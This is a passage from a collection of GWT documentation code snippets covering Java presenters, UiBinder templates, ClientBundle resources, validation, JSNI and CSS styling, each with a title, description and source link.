disableSaveButton();\n}\n```\n\n----------------------------------------\n\nTITLE: ContactsPresenter Implementation of Presenter Interface\nDESCRIPTION: The Presenter implementation that responds to UI events from the View by taking appropriate actions such as firing events or updating the selection model.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture-2.md#2025-04-09_snippet_6\n\nLANGUAGE: java\nCODE:\n```\npublic class ContactsPresenter implements Presenter {\n  ...\n  public void onAddButtonClicked() {\n    eventBus.fireEvent(new AddContactEvent());\n  }\n\n  public void onDeleteButtonClicked() {\n    deleteSelectedContacts();\n  }\n\n  public void onItemClicked(ContactDetails contactDetails) {\n    eventBus.fireEvent(new EditContactEvent(contactDetails.getId()));\n  }\n\n  public void onItemSelected(ContactDetails contactDetails) {\n    if (selectionModel.isSelected(contactDetails)) {\n      selectionModel.removeSelection(contactDetails);\n    }\n    else {\n      selectionModel.addSelection(contactDetails);\n    }\n  }\n  ...\n}\n```\n\n----------------------------------------\n\nTITLE: HTML Host Page for GWT Application\nDESCRIPTION: Example of a basic HTML host page that loads a GWT application, including required script tags, history iframe, and meta properties for deferred binding.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideOrganizingProjects.md#2025-04-09_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<html>\n  <head>\n    <!-- Properties can be specified to influence deferred binding -->\n    <meta name='gwt:property' content='locale=en_UK'>\n    \n    <!-- Stylesheets are optional, but useful -->\n    <link rel=\"stylesheet\" href=\"Calendar.css\">\n    \n    <!-- Titles are optional, but useful -->\n    <title>Calendar App</title>\n    \n  </head>\n  <body>\n   \n    <!-- This script tag is what actually loads the GWT module.  The -->\n    <!-- 'nocache.js' file (also called a \"selection script\") is     -->\n    <!-- produced by the GWT compiler in the module output directory -->\n    <!-- or generated automatically in development mode.             -->\n    <script language=\"javascript\" src=\"calendar/calendar.nocache.js\"></script>\n    \n    <!-- Include a history iframe to enable full GWT history support -->\n    <!-- (the id must be exactly as shown)                           -->\n    <iframe src=\"javascript:''\" id=\"__gwt_historyFrame\" style=\"width:0;height:0;border:0\"></iframe>\n    \n  </body>\n </html>\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom Serializable Exception Class for GWT RPC\nDESCRIPTION: This snippet shows how to create a custom exception class that can be serialized and sent via GWT RPC. The DelistedException class extends Exception, implements Serializable, and includes a field to store the stock symbol that caused the exception.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/RPC.md#2025-04-09_snippet_12\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.gwt.sample.stockwatcher.client;\n\nimport java.io.Serializable;\n\npublic class DelistedException extends Exception implements Serializable {\n\n  private String symbol;\n\n  public DelistedException() {\n  }\n\n  public DelistedException(String symbol) {\n    this.symbol = symbol;\n  }\n\n  public String getSymbol() {\n    return this.symbol;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Inheriting GWT Visual Theme Resources in Module XML\nDESCRIPTION: Shows how to inherit only the public resources of a GWT visual theme without injecting the full stylesheet.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiCss.md#2025-04-09_snippet_7\n\nLANGUAGE: xml\nCODE:\n```\n<inherits name='com.google.gwt.user.theme.standard.StandardResources'/>\n```\n\n----------------------------------------\n\nTITLE: UiBinder Template for HelloView in GWT MVP\nDESCRIPTION: The XML template used by UiBinder for the HelloView implementation. It defines the HTML structure with style classes and UI field bindings for the view.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideMvpActivitiesAndPlaces.md#2025-04-09_snippet_4\n\nLANGUAGE: html\nCODE:\n```\n<!DOCTYPE ui:UiBinder SYSTEM \"http://dl.google.com/gwt/DTD/xhtml.ent\">\n<ui:UiBinder xmlns:ui=\"urn:ui:com.google.gwt.uibinder\"\n             xmlns:g=\"urn:import:com.google.gwt.user.client.ui\">\n    <ui:style>\n        .important {\n            font-weight: bold;\n        }\n    </ui:style>\n    <g:HTMLPanel>\n        Hello,\n        <span class=\"{style.important}\" ui:field=\"nameSpan\" />\n        <g:Anchor ui:field=\"goodbyeLink\" text=\"Say good-bye\"></g:Anchor>\n    </g:HTMLPanel>\n</ui:UiBinder>\n```\n\n----------------------------------------\n\nTITLE: Tagged HTML with ui:ph for Protected Field Values\nDESCRIPTION: An improved version using ui:ph elements to make the ui:field spans opaque to translators, with examples for context.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinderI18n.md#2025-04-09_snippet_8\n\nLANGUAGE: xml\nCODE:\n```\n<ui:msg>\n  (closed <ui:ph name='closingDate' example=\"7/12/2008\"><span ui:field=\"closingDate\"/></ui:ph>\n  through <ui:ph name='reopeningDate' example=\"7/12/2008\"><span ui:field=\"reopeningDate\"/></ui:ph>)\n</ui:msg>\n```\n\n----------------------------------------\n\nTITLE: Defining DataResources in GWT ClientBundle\nDESCRIPTION: Demonstrates how to create a ClientBundle with DataResource methods that can be referenced from CSS. This allows for programmatic access to data resources like cursor files.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_19\n\nLANGUAGE: java\nCODE:\n```\ninterface MyResources extends ClientBundle {\n  @Source(\"myCursor.cur\")\n  DataResource fancyCursorResource();\n\n  @Source(\"my.css\")\n  CssResource css();\n}\n```\n\n----------------------------------------\n\nTITLE: Defining a Validation Group in Java\nDESCRIPTION: Creation of a custom validation group interface called Minimal, which can be used to specify subsets of constraints to validate.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideValidation.md#2025-04-09_snippet_5\n\nLANGUAGE: java\nCODE:\n```\n/** Validates a minimal set of constraints */\npublic interface Minimal { }\n```\n\n----------------------------------------\n\nTITLE: Basic Presenter Implementation with Data Transfer in GWT\nDESCRIPTION: Initial implementation showing how a presenter converts model data to simple strings for the view.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture-2.md#2025-04-09_snippet_7\n\nLANGUAGE: java\nCODE:\n```\npublic class ContactsPresenter implements Presenter {\n  ...\n  public void onSuccess(ArrayList<ContactDetails> result) {\n    contactDetails = result;\n    sortContactDetails();\n    List<String> data = new ArrayList<String>();\n    for (int i = 0; i < result.size(); ++i) {\n      data.add(contactDetails.get(i).getDisplayName());\n    }\n\n    display.setData(data);\n  }\n  ...\n}\n```\n\n----------------------------------------\n\nTITLE: Finding Anchor Elements in DOM using JSNI in GWT\nDESCRIPTION: This JSNI method finds all child elements that are anchor tags, assigns them unique IDs, and returns a list of these IDs to the caller.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiDom.md#2025-04-09_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\n/**\n * Find all child elements that are anchor tags,\n * assign a unique id to them, and return a list of\n * the unique ids to the caller.\n */\nprivate native void putElementLinkIDsInList(Element elt, ArrayList<String> list) /*-{\n  var links = elt.getElementsByTagName(\"a\");\n\n  for (var i = 0; i < links.length; i++ ) {\n    var link = links.item(i);\n    link.id = (\"uid-a-\" + i);\n    list.@java.util.ArrayList::add(Ljava/lang/Object;) (link.id);\n  }\n}-*/;\n```\n\n----------------------------------------\n\nTITLE: Validating with Default Group\nDESCRIPTION: Code to validate an Address object using the Default validation group, which will check all constraints not assigned to specific groups plus those explicitly assigned to Default.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideValidation.md#2025-04-09_snippet_8\n\nLANGUAGE: java\nCODE:\n```\nAddress address = new Address();\nvalidator.validate(address);\n```\n\n----------------------------------------\n\nTITLE: Mixing Fixed and Relative Column Widths in GWT CellTable\nDESCRIPTION: Illustrates how to combine fixed-width and percentage-based columns in a CellTable, useful for elements like checkboxes that need specific widths while other columns remain flexible.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiCellTable.md#2025-04-09_snippet_5\n\nLANGUAGE: java\nCODE:\n```\ntable.setWidth(\"100%\", true);\n    table.setColumnWidth(checkboxCol, 10.0, Unit.PX);\n    table.setColumnWidth(nameCol, 35.0, Unit.PCT);\n    table.setColumnWidth(descriptionCol, 65.0, Unit.PCT);\n```\n\n----------------------------------------\n\nTITLE: Setting Relative Column Widths in GWT CellTable\nDESCRIPTION: Shows how to set relative percentage-based widths for columns in a CellTable, ensuring all columns add up to 100% of the table width.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiCellTable.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\ntable.setWidth(\"100%\", true);\n    table.setColumnWidth(col0, 10.0, Unit.PCT);\n    table.setColumnWidth(col1, 25.0, Unit.PCT);\n    table.setColumnWidth(col2, 25.0, Unit.PCT);\n    table.setColumnWidth(col3, 40.0, Unit.PCT);\n```\n\n----------------------------------------\n\nTITLE: Integrating CSS in UiBinder Templates with ui:style Element\nDESCRIPTION: Shows how to define CSS styles directly within a UiBinder template using the ui:style element and apply them to HTML elements.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_18\n\nLANGUAGE: xml\nCODE:\n```\n<ui:UiBinder xmlns:ui='urn:ui:com.google.gwt.uibinder'>\n\n  <ui:style>\n    .pretty { background-color: Skyblue; }\n  </ui:style>\n\n  <div class='{style.pretty}'>\n    Hello, <span ui:field='nameSpan'/>.\n  </div>\n\n</ui:UiBinder>\n```\n\n----------------------------------------\n\nTITLE: Integrating CSS in UiBinder Templates with ui:style Element\nDESCRIPTION: Shows how to define CSS styles directly within a UiBinder template using the ui:style element and apply them to HTML elements.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_18\n\nLANGUAGE: xml\nCODE:\n```\n<ui:UiBinder xmlns:ui='urn:ui:com.google.gwt.uibinder'>\n\n  <ui:style>\n    .pretty { background-color: Skyblue; }\n  </ui:style>\n\n  <div class='{style.pretty}'>\n    Hello, <span ui:field='nameSpan'/>.\n  </div>\n\n</ui:UiBinder>\n```\n\n----------------------------------------\n\nTITLE: Map Properties Example for GWT Constants\nDESCRIPTION: Example of defining map-valued properties in a properties file, showing how to create key-value mappings for colors.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18nConstants.md#2025-04-09_snippet_4\n\nLANGUAGE: properties\nCODE:\n```\ncolors=header, body, footer\nheader=red\nbody=white\nfooter=blue\n```\n\n----------------------------------------\n\nTITLE: Creating a GWT Validator Factory Implementation\nDESCRIPTION: Implementation of a validator factory that extends AbstractGwtValidatorFactory and creates a validator for the Person class. This factory is required to bootstrap the validation process.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideValidation.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\npublic final class SampleValidatorFactory extends AbstractGwtValidatorFactory {\n\n  /**\n   * Validator marker for the Validation Sample project. Only the classes and groups listed\n   * in the {@link GwtValidation} annotation can be validated.\n   */\n  @GwtValidation(Person.class)\n  public interface GwtValidator extends Validator {\n  }\n\n  @Override\n  public AbstractGwtValidator createValidator() {\n    return GWT.create(GwtValidator.class);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Applying Styles to Dynamically Added Stock Rows in Java\nDESCRIPTION: This Java snippet shows how to apply CSS styles to dynamically added stock rows in the addStock method. It styles the numeric columns and remove column for each new stock entry.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/style.md#2025-04-09_snippet_5\n\nLANGUAGE: java\nCODE:\n```\n// Add the stock to the table.\nint row = stocksFlexTable.getRowCount();\nstocks.add(symbol);\nstocksFlexTable.setText(row, 0, symbol);\nstocksFlexTable.getCellFormatter().addStyleName(row, 1, \"watchListNumericColumn\");\nstocksFlexTable.getCellFormatter().addStyleName(row, 2, \"watchListNumericColumn\");\nstocksFlexTable.getCellFormatter().addStyleName(row, 3, \"watchListRemoveColumn\");\n```\n\n----------------------------------------\n\nTITLE: Creating CellBrowser Instance in GWT\nDESCRIPTION: Shows how to instantiate a CellBrowser component using a model and initial item. The CellBrowser displays node levels side-by-side, similar to CellTree but with a different visual layout.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiCellWidgets.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\n// Create the browser using the model.\n    CellBrowser browser = new CellBrowser(model, \"Item 1\");\n```\n\n----------------------------------------\n\nTITLE: Adding Content Panel to Paper Drawer Layout in GWT UiBinder\nDESCRIPTION: This snippet shows how to add a content panel for todo items within the paper-header-panel in the main section of the drawer layout. The content div is given specific layout classes from Polymer.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/elements-buildui.md#2025-04-09_snippet_8\n\nLANGUAGE: XML\nCODE:\n```\n<g:HTMLPanel>\n   ...\n    <div main=\"\">\n        <paper-header-panel mode=\"seamed\">\n            <paper-toolbar>\n                <paper-icon-button ui:field=\"menu\" icon=\"more-vert\" paper-drawer-toggle=\"\"/>\n                <span>Todo List</span>\n            </paper-toolbar>\n\n            <div ui:field=\"content\" class=\"content vertical center-justified layout\"/>\n\n        </paper-header-panel>\n    </div>\n   ...\n</g:HTMLPanel>\n```\n\n----------------------------------------\n\nTITLE: JSNI Method Closure Handling\nDESCRIPTION: Demonstrates proper handling of 'this' reference in JSNI method closures. Shows incorrect and correct approaches to maintaining object references in callbacks.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_Client.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\npublic native void doSomething() /*-{\n    this.@com.company.app.client.MyClass::doSomethingElse(Ljava/lang/String;)(\"immediate\");\n    someObj.onclick = function() {\n        this.@com.company.app.client.MyClass::doSomethingElse(Ljava/lang/String;)(\"on click\");\n    }\n}-*/;\n```\n\nLANGUAGE: java\nCODE:\n```\npublic native void doSomething() /*-{\n    var foo = this;\n    this.@com.company.app.client.MyClass::doSomethingElse(Ljava/lang/String;)(\"immediate\");\n    someObj.onclick = function() {\n        foo.@com.company.app.client.MyClass::doSomethingElse(Ljava/lang/String;)(\"on click\");\n    }\n}-*/;\n```\n\n----------------------------------------\n\nTITLE: Defining Image Sprites in GWT CssResource\nDESCRIPTION: Shows how to define and use image sprites in GWT. The @sprite CSS directive generates necessary CSS properties from an ImageResource reference, supporting various options like RepeatStyle.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_16\n\nLANGUAGE: css\nCODE:\n```\n@sprite .mySpriteClass {gwt-image: \"imageAccessor\"; other: property;} => generates =>\n\n  .mySpriteClass {\n    background-image: url(gen.png);\n    clip: ...;\n    width: 27px;\n    height: 42px;\n    other: property;\n  }\n```\n\n----------------------------------------\n\nTITLE: Adding Todo Items in GWT Application\nDESCRIPTION: This method adds a new todo item to the application. It creates a new Item object, sets its title and description, appends it to the content element, and adds it to the items collection.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/elements-applogic.md#2025-04-09_snippet_6\n\nLANGUAGE: Java\nCODE:\n```\nprivate void addItem(String title, String description) {\n  Item item = new Item();\n  item.setTitle(title);\n  item.setDescription(description);\n  content.appendChild(item.getElement());\n  items.add(item);\n}\n```\n\n----------------------------------------\n\nTITLE: Using ImageResource to Create Image Widgets in GWT\nDESCRIPTION: Code example showing how to instantiate a ClientBundle and use an ImageResource to create an Image widget in a GWT application.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_7\n\nLANGUAGE: java\nCODE:\n```\nResources resources = GWT.create(Resources.class);\nImage img = new Image(resources.logo());\n```\n\n----------------------------------------\n\nTITLE: Implementing Employee Service Stub in GWT\nDESCRIPTION: Implementation of an EmployeeRequest service stub that defines various methods for employee management including counting, finding, and manipulating employee records.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideRequestFactory.md#2025-04-09_snippet_6\n\nLANGUAGE: java\nCODE:\n```\n@Service(Employee.class)\npublic interface EmployeeRequest extends RequestContext {\n\n  Request<Long> countEmployees();\n\n  Request<Long> countEmployeesByDepartment(\n      String department);\n\n  Request<List<EmployeeProxy>> findAllEmployees();\n\n  Request<EmployeeProxy> findEmployee(Long id);\n\n  Request<List<EmployeeProxy>> findEmployeeEntries(int firstResult,\n      int maxResults);\n\n  Request<List<EmployeeProxy>> findEmployeeEntriesByDepartment(\n      String department, int firstResult, int maxResults);\n\n  InstanceRequest<EmployeeProxy, Void> persist();\n\n  InstanceRequest<EmployeeProxy, Void> remove();\n\n}\n```\n\n----------------------------------------\n\nTITLE: Setting ID for GWT Widget in Java\nDESCRIPTION: Demonstrates how to programmatically set an ID for a GWT widget in Java for CSS targeting.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiCss.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\nButton b = new Button();\nDOM.setElementAttribute(b.getElement(), \"id\", \"my-button-id\")\n```\n\n----------------------------------------\n\nTITLE: Passing Constructor Arguments from UiBinder Template\nDESCRIPTION: Shows how to pass constructor arguments as attributes in a UiBinder template when using widgets with @UiConstructor annotations.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_16\n\nLANGUAGE: xml\nCODE:\n```\n<!-- UserDashboard.ui.xml -->\n<g:HTMLPanel xmlns:ui='urn:ui:com.google.gwt.uibinder'\n  xmlns:g='urn:import:com.google.gwt.user.client.ui'\n  xmlns:my='urn:import:com.my.app.widgets' >\n\n  <my:WeatherReport ui:field='weather'/>\n  <my:Stocks ui:field='stocks'/>\n  <my:CricketScores ui:field='scores' teamNames='AUS, SAF, WA, QLD, VIC'/>\n\n</g:HTMLPanel>\n```\n\n----------------------------------------\n\nTITLE: Using JsonpRequestBuilder for Cross-Domain JSON Requests in GWT\nDESCRIPTION: Demonstrates how to use JsonpRequestBuilder to make cross-domain JSON requests in GWT applications. This approach works around the browser's Same Origin Policy limitation for AJAX requests.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_Server.md#2025-04-09_snippet_3\n\nLANGUAGE: Java\nCODE:\n```\nJsonpRequestBuilder\n```\n\n----------------------------------------\n\nTITLE: Comparing Java Reflection vs GWT Creation Methods\nDESCRIPTION: Shows the difference between traditional Java reflection class instantiation and GWT's deferred binding approach. While Java uses Class.forName(), GWT uses GWT.create() to handle permutation-based class creation at compile time.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_Client.md#2025-04-09_snippet_4\n\nLANGUAGE: Java\nCODE:\n```\nClass.forName(\"MyClass\")\n```\n\nLANGUAGE: Java\nCODE:\n```\nGWT.create(MyClass)\n```\n\n----------------------------------------\n\nTITLE: Handling Cell Events with UiBinder in GWT\nDESCRIPTION: This snippet demonstrates how to handle cell events using UiBinder in GWT. It includes modifications to the HelloWorldCell example to handle click events on the name span.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_33\n\nLANGUAGE: java\nCODE:\n```\ninterface MyUiRenderer extends UiRenderer {\n  void render(SafeHtmlBuilder sb, String name);\n  onBrowserEvent(HelloWorldCell o, NativeEvent e, Element p, String n);\n}\n\npublic HelloWorldCell() {\n  super(\"click\");\n}\n\n@Override\npublic void onBrowserEvent(Context context, Element parent, String value,\n    NativeEvent event, ValueUpdater<String> updater) {\n  renderer.onBrowserEvent(this, event, parent, value);\n}\n\n@UiHandler({\"nameSpan\"})\nvoid onNameGotPressed(ClickEvent event, Element parent, String name) {\n  Window.alert(name + \" was pressed!\");\n}\n```\n\n----------------------------------------\n\nTITLE: JSON Variable Assignment Response\nDESCRIPTION: Example of server response assigning JSON data to a JavaScript variable, commonly used with script tag injection.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/security_for_gwt_applications.md#2025-04-09_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\nvar result = { 'data': ['foo', 'bar'] };\n```\n\n----------------------------------------\n\nTITLE: Parsing JSON String to JavaScriptObject in GWT\nDESCRIPTION: Method demonstrating how to safely parse a JSON string into a JavaScriptObject using GWT's JsonUtils. This is typically used when processing HTTP response data.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsJSON.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\n/*\n * Takes in a JSON String and evals it.\n * @param JSON String that you trust\n * @return JavaScriptObject that you can cast to an Overlay Type\n */\npublic static <T extends JavaScriptObject> T parseJson(String jsonStr)\n{\n  return JsonUtils.safeEval(jsonStr);\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Click Handler for Add Button in GWT\nDESCRIPTION: Java method that handles the click event on the add button. When clicked, it opens the add item dialog.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/widgets-applogic.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\n@UiHandler(\"addButton\")\nprotected void onAddButtonClick(ClickEvent e) {\n  addItemDialog.open();\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Up Xvfb Virtual Display for GWT Tests in Unix\nDESCRIPTION: Shell commands to configure a virtual X display using Xvfb for running GWT tests in a headless environment like a cron job, which requires an X display for some operations.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_Troubleshooting.md#2025-04-09_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nexport DISPLAY=:2\n```\n\nLANGUAGE: shell\nCODE:\n```\nps -ef | grep Xvfb | grep -v grep >> /dev/null || Xvfb :2 -ac &\n```\n\n----------------------------------------\n\nTITLE: Styling GWT Button in CSS\nDESCRIPTION: This CSS snippet shows the default styling for GWT buttons, which is defined in the standard.css file provided by GWT.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/style.md#2025-04-09_snippet_9\n\nLANGUAGE: css\nCODE:\n```\n.gwt-Button {\n    background:transparent url(images/hborder.png) repeat-x scroll 0px -27px;\n    border:1px outset #CCCCCC;\n    cursor:pointer;\n    font-size:small;\n    margin:0pt;\n    padding:3px 5px;\n    text-decoration:none;\n}\n```\n\n----------------------------------------\n\nTITLE: Defining ImageResource Methods with Options in ClientBundle\nDESCRIPTION: Shows how to define ImageResource methods in a ClientBundle interface with source paths and additional options like RTL flipping for internationalization.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_6\n\nLANGUAGE: java\nCODE:\n```\ninterface Resources extends ClientBundle {\n  @Source(\"logo.png\")\n  ImageResource logo();\n\n  @Source(\"arrow.png\")\n  @ImageOptions(flipRtl = true)\n  ImageResource pointer();\n}\n```\n\n----------------------------------------\n\nTITLE: Applying CSS Styles to GWT Widgets in UiBinder\nDESCRIPTION: Demonstrates how to apply CSS styles to GWT widgets in UiBinder templates using both styleName (to replace default styles) and addStyleNames (to add styles without replacing defaults).\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_21\n\nLANGUAGE: xml\nCODE:\n```\n<ui:UiBinder xmlns:ui='urn:ui:com.google.gwt.uibinder'\n      xmlns:g='urn:import:com.google.gwt.user.client.ui'>\n  <ui:style>\n    .hot { color: magenta; }\n    .pretty { background-color: Skyblue; }\n  </ui:style>\n\n  <g:PushButton styleName='{style.pretty}'>This button doesn't look like one</g:PushButton>\n  <g:PushButton addStyleNames='{style.pretty} {style.hot}'>Push my hot button!</g:PushButton>\n\n</ui:UiBinder>\n```\n\n----------------------------------------\n\nTITLE: Implementing EntryPoint Class in GWT\nDESCRIPTION: This snippet demonstrates how to create a basic EntryPoint class for a GWT module. It includes the onModuleLoad() method, which is the entry point for the GWT application. The example logs a message to the development mode console.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsClient.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\npackage com.example.foo.client;\n\nimport com.google.gwt.core.client.EntryPoint;\nimport com.google.gwt.core.client.GWT;\n\n/**\n * Entry point classes define onModuleLoad().\n */\npublic class Foo implements EntryPoint {\n\n  /**\n   * This is the entry point method. Initialize you GWT module here.\n   */\n  public void onModuleLoad() {\n\n    // Writes Hello World to the module log window.\n    GWT.log(\"Hello World!\", null);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Provided Fields for Resource Instances in UiBinder\nDESCRIPTION: Shows how to use the @UiField(provided = true) annotation to manually provide resource instances to UiBinder templates, offering more concise control over resource management.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_26\n\nLANGUAGE: java\nCODE:\n```\npublic class LogoNamePanel extends Composite {\n  interface MyUiBinder extends UiBinder<Widget, LogoNamePanel> {}\n  private static final MyUiBinder uiBinder = GWT.create(MyUiBinder.class);\n\n  @UiField SpanElement nameSpan;\n\n  @UiField(provided = true)\n  final Resources resources;\n\n  public LogoNamePanel(Resources resources) {\n    this.resources = resources;\n    initWidget(uiBinder.createAndBindUi(this));\n  }\n\n  public void setUserName(String userName) {\n    nameSpan.setInnerText(userName);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring a Service with ServiceLocator in Java\nDESCRIPTION: This snippet demonstrates how to annotate a service interface with both the service implementation class and the ServiceLocator implementation. This configuration tells RequestFactory how to instantiate the service implementation.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideRequestFactory.md#2025-04-09_snippet_12\n\nLANGUAGE: java\nCODE:\n```\n@Service(value = EmployeeDao.class, locator = MyServiceLocator.class)\ninterface EmployeeRequestContext extends RequestContext\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Layout Issues with VerticalPanel and DockPanel in GWT\nDESCRIPTION: This code shows a basic layout attempt that positions two buttons on opposite sides of the browser window using DockPanel. The code demonstrates a common layout issue where panels don't expand as expected.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_UI.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nVerticalPanel vertPanel = new VerticalPanel();\n\n    DockPanel dockPanel = new DockPanel();\n    dockPanel.setWidth(\"100%\");\n    dockPanel.add(new Button(\"leftButton\"), DockPanel.WEST);\n    dockPanel.add(new Button(\"rightButton\"), DockPanel.EAST);\n\n    vertPanel.add(dockPanel);\n\n    RootPanel.get().add(vertPanel);\n```\n\n----------------------------------------\n\nTITLE: Using DateTimeFormat with Various Default Formats in GWT\nDESCRIPTION: Examples of using multiple predefined date and time formats in GWT to format a Date object according to different display requirements.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsFormatting.md#2025-04-09_snippet_5\n\nLANGUAGE: java\nCODE:\n```\nDate today = new Date();\n\n// prints Tue Dec 18 12:01:26 GMT-500 2007 in the default locale.\nGWT.log(today.toString(), null);\n\n// prints 12/18/07 in the default locale\nGWT.log(DateTimeFormat.getShortDateFormat().format(today), null);\n\n// prints December 18, 2007 in the default locale\nGWT.log(DateTimeFormat.getLongDateFormat().format(today), null);\n\n// prints 12:01 PM in the default locale\nGWT.log(DateTimeFormat.getShortTimeFormat().format(today), null);\n\n// prints 12:01:26 PM GMT-05:00 in the default locale\nGWT.log(DateTimeFormat.getLongTimeFormat().format(today), null);\n\n// prints Dec 18, 2007 12:01:26 PM in the default locale\nGWT.log(DateTimeFormat.getMediumDateTimeFormat().format(today), null);\n```\n\n----------------------------------------\n\nTITLE: Importing JavaScript Types to Java with @JsType(isNative=true)\nDESCRIPTION: This example shows how to import a JavaScript native type (the global JSON object) into a Java class using @JsType with isNative=true. It maps the stringify and parse methods.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsJsInterop.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\n@JsType(isNative = true, namespace = JsPackage.GLOBAL)\npublic class JSON {\n    public static native String stringify(Object obj);\n\n    public static native Object parse(String obj);\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring GWT Validator with Validation Groups\nDESCRIPTION: Example of configuring a GWT validator interface to support both Default and Minimal validation groups for the Person class.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideValidation.md#2025-04-09_snippet_6\n\nLANGUAGE: java\nCODE:\n```\n@GwtValidation(value = Person.class, groups = {Default.class, Minimal.class})\npublic interface GwtValidator extends Validator {\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Confirm Add Button Click Handler in GWT\nDESCRIPTION: Java method that handles the click event on the confirm add button. It validates the input and adds a new item to the UI if the title is not empty.\nSOURCE: 